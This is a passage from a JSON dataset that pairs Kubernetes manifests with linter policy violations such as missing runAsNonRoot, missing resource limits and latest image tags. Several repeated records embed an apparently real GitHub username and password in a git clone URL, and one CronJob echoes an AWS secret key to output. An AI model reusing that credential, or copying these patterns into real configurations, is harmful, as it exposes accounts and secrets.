    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"alpine\" does not have a read-only root file system"
  },
  {
    "id": "2809",
    "manifest_path": "data/manifests/the_stack_sample/sample_0794.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app.kubernetes.io/name: hello-secrets\n        annotations:\n          vault.security.banzaicloud.io/vault-addr: https://vault:8200\n          vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n      spec:\n        containers:\n        - name: alpine\n          image: alpine\n          command:\n          - sh\n          - -c\n          - echo $AWS_SECRET_ACCESS_KEY\n          env:\n          - name: AWS_SECRET_ACCESS_KEY\n            value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"alpine\" is not set to runAsNonRoot"
  },
  {
    "id": "2810",
    "manifest_path": "data/manifests/the_stack_sample/sample_0794.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app.kubernetes.io/name: hello-secrets\n        annotations:\n          vault.security.banzaicloud.io/vault-addr: https://vault:8200\n          vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n      spec:\n        containers:\n        - name: alpine\n          image: alpine\n          command:\n          - sh\n          - -c\n          - echo $AWS_SECRET_ACCESS_KEY\n          env:\n          - name: AWS_SECRET_ACCESS_KEY\n            value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"alpine\" has cpu request 0"
  },
  {
    "id": "2811",
    "manifest_path": "data/manifests/the_stack_sample/sample_0794.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app.kubernetes.io/name: hello-secrets\n        annotations:\n          vault.security.banzaicloud.io/vault-addr: https://vault:8200\n          vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n      spec:\n        containers:\n        - name: alpine\n          image: alpine\n          command:\n          - sh\n          - -c\n          - echo $AWS_SECRET_ACCESS_KEY\n          env:\n          - name: AWS_SECRET_ACCESS_KEY\n            value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"alpine\" has memory limit 0"
  },
  {
    "id": "2812",
    "manifest_path": "data/manifests/the_stack_sample/sample_0796.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: review-app-reaper\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          sidecar.istio.io/inject: 'false'\n      spec:\n        serviceAccountName: tuber\n        containers:\n        - name: review-app-reaper\n          image: '{{ .tuberImage }}'\n          command:\n          - tuber\n          - review-app-reaper\n          envFrom:\n          - secretRef:\n              name: tuber-env\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"review-app-reaper\" is using an invalid container image, \"{{ .tuberImage }}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2813",
    "manifest_path": "data/manifests/the_stack_sample/sample_0796.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: review-app-reaper\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          sidecar.istio.io/inject: 'false'\n      spec:\n        serviceAccountName: tuber\n        containers:\n        - name: review-app-reaper\n          image: '{{ .tuberImage }}'\n          command:\n          - tuber\n          - review-app-reaper\n          envFrom:\n          - secretRef:\n              name: tuber-env\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"review-app-reaper\" does not have a read-only root file system"
  },
  {
    "id": "2814",
    "manifest_path": "data/manifests/the_stack_sample/sample_0796.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: review-app-reaper\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          sidecar.istio.io/inject: 'false'\n      spec:\n        serviceAccountName: tuber\n        containers:\n        - name: review-app-reaper\n          image: '{{ .tuberImage }}'\n          command:\n          - tuber\n          - review-app-reaper\n          envFrom:\n          - secretRef:\n              name: tuber-env\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"tuber\" not found"
  },
  {
    "id": "2815",
    "manifest_path": "data/manifests/the_stack_sample/sample_0796.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: review-app-reaper\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          sidecar.istio.io/inject: 'false'\n      spec:\n        serviceAccountName: tuber\n        containers:\n        - name: review-app-reaper\n          image: '{{ .tuberImage }}'\n          command:\n          - tuber\n          - review-app-reaper\n          envFrom:\n          - secretRef:\n              name: tuber-env\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"review-app-reaper\" is not set to runAsNonRoot"
  },
  {
    "id": "2816",
    "manifest_path": "data/manifests/the_stack_sample/sample_0796.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: review-app-reaper\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          sidecar.istio.io/inject: 'false'\n      spec:\n        serviceAccountName: tuber\n        containers:\n        - name: review-app-reaper\n          image: '{{ .tuberImage }}'\n          command:\n          - tuber\n          - review-app-reaper\n          envFrom:\n          - secretRef:\n              name: tuber-env\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"review-app-reaper\" has cpu request 0"
  },
  {
    "id": "2817",
    "manifest_path": "data/manifests/the_stack_sample/sample_0796.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: review-app-reaper\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          sidecar.istio.io/inject: 'false'\n      spec:\n        serviceAccountName: tuber\n        containers:\n        - name: review-app-reaper\n          image: '{{ .tuberImage }}'\n          command:\n          - tuber\n          - review-app-reaper\n          envFrom:\n          - secretRef:\n              name: tuber-env\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"review-app-reaper\" has memory limit 0"
  },
  {
    "id": "2818",
    "manifest_path": "data/manifests/the_stack_sample/sample_0797.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    app: simple-mvcboot\n  name: simple-mvcboot\n  namespace: default\nspec:\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: simple-mvcboot\n    spec:\n      containers:\n      - image: sme/simple-mvc-boot:0.1\n        name: simple-mvcboot\n        ports:\n        - containerPort: 8040\n          name: http\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2819",
    "manifest_path": "data/manifests/the_stack_sample/sample_0797.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    app: simple-mvcboot\n  name: simple-mvcboot\n  namespace: default\nspec:\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: simple-mvcboot\n    spec:\n      containers:\n      - image: sme/simple-mvc-boot:0.1\n        name: simple-mvcboot\n        ports:\n        - containerPort: 8040\n          name: http\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"simple-mvcboot\" does not have a read-only root file system"
  },
  {
    "id": "2820",
    "manifest_path": "data/manifests/the_stack_sample/sample_0797.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    app: simple-mvcboot\n  name: simple-mvcboot\n  namespace: default\nspec:\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: simple-mvcboot\n    spec:\n      containers:\n      - image: sme/simple-mvc-boot:0.1\n        name: simple-mvcboot\n        ports:\n        - containerPort: 8040\n          name: http\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"simple-mvcboot\" is not set to runAsNonRoot"
  },
  {
    "id": "2821",
    "manifest_path": "data/manifests/the_stack_sample/sample_0797.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    app: simple-mvcboot\n  name: simple-mvcboot\n  namespace: default\nspec:\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: simple-mvcboot\n    spec:\n      containers:\n      - image: sme/simple-mvc-boot:0.1\n        name: simple-mvcboot\n        ports:\n        - containerPort: 8040\n          name: http\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"simple-mvcboot\" has cpu request 0"
  },
  {
    "id": "2822",
    "manifest_path": "data/manifests/the_stack_sample/sample_0797.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    app: simple-mvcboot\n  name: simple-mvcboot\n  namespace: default\nspec:\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: simple-mvcboot\n    spec:\n      containers:\n      - image: sme/simple-mvc-boot:0.1\n        name: simple-mvcboot\n        ports:\n        - containerPort: 8040\n          name: http\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"simple-mvcboot\" has memory limit 0"
  },
  {
    "id": "2823",
    "manifest_path": "data/manifests/the_stack_sample/sample_0798.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20210707-32dc49e04b\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prow-controller-manager\" does not have a read-only root file system"
  },
  {
    "id": "2824",
    "manifest_path": "data/manifests/the_stack_sample/sample_0798.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20210707-32dc49e04b\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"prow-controller-manager\" not found"
  },
  {
    "id": "2825",
    "manifest_path": "data/manifests/the_stack_sample/sample_0798.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20210707-32dc49e04b\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prow-controller-manager\" is not set to runAsNonRoot"
  },
  {
    "id": "2826",
    "manifest_path": "data/manifests/the_stack_sample/sample_0798.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20210707-32dc49e04b\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"prow-controller-manager\" has cpu request 0"
  },
  {
    "id": "2827",
    "manifest_path": "data/manifests/the_stack_sample/sample_0798.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20210707-32dc49e04b\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prow-controller-manager\" has memory limit 0"
  },
  {
    "id": "2828",
    "manifest_path": "data/manifests/the_stack_sample/sample_0800.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: db\n  labels:\n    name: postgres-service\n    app: demo-voting-app\nspec:\n  ports:\n  - port: 5432\n    targetPort: 5432\n  selector:\n    name: postgres-pod\n    app: demo-voting-app\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:demo-voting-app name:postgres-pod])"
  },
  {
    "id": "2829",
    "manifest_path": "data/manifests/the_stack_sample/sample_0801.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    k8s-app: research\n    user: xueting\n  namespace: image-model\nspec:\n  template:\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: gpu-type\n                operator: In\n                values:\n                - 1080Ti\n                - 2080Ti\n                - '2080'\n              - key: kubernetes.io/hostname\n                operator: NotIn\n                values:\n                - patternlab.calit2.optiputer.net\n                - k8s-gpu-03.sdsc.optiputer.net\n      containers:\n      - name: research\n        image: gitlab-registry.nautilus.optiputer.net/sunshineatnoon/image-model:latest\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        args:\n        - cd /workspace && git clone https://sunshineatnoon:49531218Lxt@github.com/sunshineatnoon/taming-transformers\n          && cd taming-transformers && python main.py --base configs/custom_simple_vqgan.yaml\n          -t True --gpus 0,1\n        resources:\n          requests:\n            cpu: '10'\n            memory: 6Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 20Gi\n          limits:\n            cpu: '24'\n            memory: 12Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 30Gi\n        volumeMounts:\n        - mountPath: /mnt/source\n          name: src\n        - mountPath: /dev/shm\n          name: dshm\n        - mountPath: /data\n          name: dst\n      initContainers:\n      - name: init-data\n        image: gitlab-registry.nautilus.optiputer.net/prp/gsutil\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - mkdir -p /mnt/dest/coco; gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco;\n          gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco; exit 0\n        volumeMounts:\n        - name: src\n          mountPath: /mnt/source\n        - name: dst\n          mountPath: /mnt/dest\n      volumes:\n      - name: dst\n        emptyDir: {}\n      - name: src\n        persistentVolumeClaim:\n          claimName: image-model-pvc\n      - name: dshm\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "2830",
    "manifest_path": "data/manifests/the_stack_sample/sample_0801.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    k8s-app: research\n    user: xueting\n  namespace: image-model\nspec:\n  template:\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: gpu-type\n                operator: In\n                values:\n                - 1080Ti\n                - 2080Ti\n                - '2080'\n              - key: kubernetes.io/hostname\n                operator: NotIn\n                values:\n                - patternlab.calit2.optiputer.net\n                - k8s-gpu-03.sdsc.optiputer.net\n      containers:\n      - name: research\n        image: gitlab-registry.nautilus.optiputer.net/sunshineatnoon/image-model:latest\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        args:\n        - cd /workspace && git clone https://sunshineatnoon:49531218Lxt@github.com/sunshineatnoon/taming-transformers\n          && cd taming-transformers && python main.py --base configs/custom_simple_vqgan.yaml\n          -t True --gpus 0,1\n        resources:\n          requests:\n            cpu: '10'\n            memory: 6Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 20Gi\n          limits:\n            cpu: '24'\n            memory: 12Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 30Gi\n        volumeMounts:\n        - mountPath: /mnt/source\n          name: src\n        - mountPath: /dev/shm\n          name: dshm\n        - mountPath: /data\n          name: dst\n      initContainers:\n      - name: init-data\n        image: gitlab-registry.nautilus.optiputer.net/prp/gsutil\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - mkdir -p /mnt/dest/coco; gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco;\n          gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco; exit 0\n        volumeMounts:\n        - name: src\n          mountPath: /mnt/source\n        - name: dst\n          mountPath: /mnt/dest\n      volumes:\n      - name: dst\n        emptyDir: {}\n      - name: src\n        persistentVolumeClaim:\n          claimName: image-model-pvc\n      - name: dshm\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"init-data\" is using an invalid container image, \"gitlab-registry.nautilus.optiputer.net/prp/gsutil\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2831",
    "manifest_path": "data/manifests/the_stack_sample/sample_0801.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    k8s-app: research\n    user: xueting\n  namespace: image-model\nspec:\n  template:\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: gpu-type\n                operator: In\n                values:\n                - 1080Ti\n                - 2080Ti\n                - '2080'\n              - key: kubernetes.io/hostname\n                operator: NotIn\n                values:\n                - patternlab.calit2.optiputer.net\n                - k8s-gpu-03.sdsc.optiputer.net\n      containers:\n      - name: research\n        image: gitlab-registry.nautilus.optiputer.net/sunshineatnoon/image-model:latest\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        args:\n        - cd /workspace && git clone https://sunshineatnoon:49531218Lxt@github.com/sunshineatnoon/taming-transformers\n          && cd taming-transformers && python main.py --base configs/custom_simple_vqgan.yaml\n          -t True --gpus 0,1\n        resources:\n          requests:\n            cpu: '10'\n            memory: 6Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 20Gi\n          limits:\n            cpu: '24'\n            memory: 12Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 30Gi\n        volumeMounts:\n        - mountPath: /mnt/source\n          name: src\n        - mountPath: /dev/shm\n          name: dshm\n        - mountPath: /data\n          name: dst\n      initContainers:\n      - name: init-data\n        image: gitlab-registry.nautilus.optiputer.net/prp/gsutil\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - mkdir -p /mnt/dest/coco; gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco;\n          gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco; exit 0\n        volumeMounts:\n        - name: src\n          mountPath: /mnt/source\n        - name: dst\n          mountPath: /mnt/dest\n      volumes:\n      - name: dst\n        emptyDir: {}\n      - name: src\n        persistentVolumeClaim:\n          claimName: image-model-pvc\n      - name: dshm\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"research\" is using an invalid container image, \"gitlab-registry.nautilus.optiputer.net/sunshineatnoon/image-model:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2832",
    "manifest_path": "data/manifests/the_stack_sample/sample_0801.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    k8s-app: research\n    user: xueting\n  namespace: image-model\nspec:\n  template:\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: gpu-type\n                operator: In\n                values:\n                - 1080Ti\n                - 2080Ti\n                - '2080'\n              - key: kubernetes.io/hostname\n                operator: NotIn\n                values:\n                - patternlab.calit2.optiputer.net\n                - k8s-gpu-03.sdsc.optiputer.net\n      containers:\n      - name: research\n        image: gitlab-registry.nautilus.optiputer.net/sunshineatnoon/image-model:latest\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        args:\n        - cd /workspace && git clone https://sunshineatnoon:49531218Lxt@github.com/sunshineatnoon/taming-transformers\n          && cd taming-transformers && python main.py --base configs/custom_simple_vqgan.yaml\n          -t True --gpus 0,1\n        resources:\n          requests:\n            cpu: '10'\n            memory: 6Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 20Gi\n          limits:\n            cpu: '24'\n            memory: 12Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 30Gi\n        volumeMounts:\n        - mountPath: /mnt/source\n          name: src\n        - mountPath: /dev/shm\n          name: dshm\n        - mountPath: /data\n          name: dst\n      initContainers:\n      - name: init-data\n        image: gitlab-registry.nautilus.optiputer.net/prp/gsutil\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - mkdir -p /mnt/dest/coco; gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco;\n          gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco; exit 0\n        volumeMounts:\n        - name: src\n          mountPath: /mnt/source\n        - name: dst\n          mountPath: /mnt/dest\n      volumes:\n      - name: dst\n        emptyDir: {}\n      - name: src\n        persistentVolumeClaim:\n          claimName: image-model-pvc\n      - name: dshm\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init-data\" does not have a read-only root file system"
  },
  {
    "id": "2833",
    "manifest_path": "data/manifests/the_stack_sample/sample_0801.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    k8s-app: research\n    user: xueting\n  namespace: image-model\nspec:\n  template:\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: gpu-type\n                operator: In\n                values:\n                - 1080Ti\n                - 2080Ti\n                - '2080'\n              - key: kubernetes.io/hostname\n                operator: NotIn\n                values:\n                - patternlab.calit2.optiputer.net\n                - k8s-gpu-03.sdsc.optiputer.net\n      containers:\n      - name: research\n        image: gitlab-registry.nautilus.optiputer.net/sunshineatnoon/image-model:latest\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        args:\n        - cd /workspace && git clone https://sunshineatnoon:49531218Lxt@github.com/sunshineatnoon/taming-transformers\n          && cd taming-transformers && python main.py --base configs/custom_simple_vqgan.yaml\n          -t True --gpus 0,1\n        resources:\n          requests:\n            cpu: '10'\n            memory: 6Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 20Gi\n          limits:\n            cpu: '24'\n            memory: 12Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 30Gi\n        volumeMounts:\n        - mountPath: /mnt/source\n          name: src\n        - mountPath: /dev/shm\n          name: dshm\n        - mountPath: /data\n          name: dst\n      initContainers:\n      - name: init-data\n        image: gitlab-registry.nautilus.optiputer.net/prp/gsutil\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - mkdir -p /mnt/dest/coco; gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco;\n          gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco; exit 0\n        volumeMounts:\n        - name: src\n          mountPath: /mnt/source\n        - name: dst\n          mountPath: /mnt/dest\n      volumes:\n      - name: dst\n        emptyDir: {}\n      - name: src\n        persistentVolumeClaim:\n          claimName: image-model-pvc\n      - name: dshm\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"research\" does not have a read-only root file system"
  },
  {
    "id": "2834",
    "manifest_path": "data/manifests/the_stack_sample/sample_0801.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    k8s-app: research\n    user: xueting\n  namespace: image-model\nspec:\n  template:\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: gpu-type\n                operator: In\n                values:\n                - 1080Ti\n                - 2080Ti\n                - '2080'\n              - key: kubernetes.io/hostname\n                operator: NotIn\n                values:\n                - patternlab.calit2.optiputer.net\n                - k8s-gpu-03.sdsc.optiputer.net\n      containers:\n      - name: research\n        image: gitlab-registry.nautilus.optiputer.net/sunshineatnoon/image-model:latest\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        args:\n        - cd /workspace && git clone https://sunshineatnoon:49531218Lxt@github.com/sunshineatnoon/taming-transformers\n          && cd taming-transformers && python main.py --base configs/custom_simple_vqgan.yaml\n          -t True --gpus 0,1\n        resources:\n          requests:\n            cpu: '10'\n            memory: 6Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 20Gi\n          limits:\n            cpu: '24'\n            memory: 12Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 30Gi\n        volumeMounts:\n        - mountPath: /mnt/source\n          name: src\n        - mountPath: /dev/shm\n          name: dshm\n        - mountPath: /data\n          name: dst\n      initContainers:\n      - name: init-data\n        image: gitlab-registry.nautilus.optiputer.net/prp/gsutil\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - mkdir -p /mnt/dest/coco; gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco;\n          gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco; exit 0\n        volumeMounts:\n        - name: src\n          mountPath: /mnt/source\n        - name: dst\n          mountPath: /mnt/dest\n      volumes:\n      - name: dst\n        emptyDir: {}\n      - name: src\n        persistentVolumeClaim:\n          claimName: image-model-pvc\n      - name: dshm\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init-data\" is not set to runAsNonRoot"
  },
  {
    "id": "2835",
    "manifest_path": "data/manifests/the_stack_sample/sample_0801.yaml",
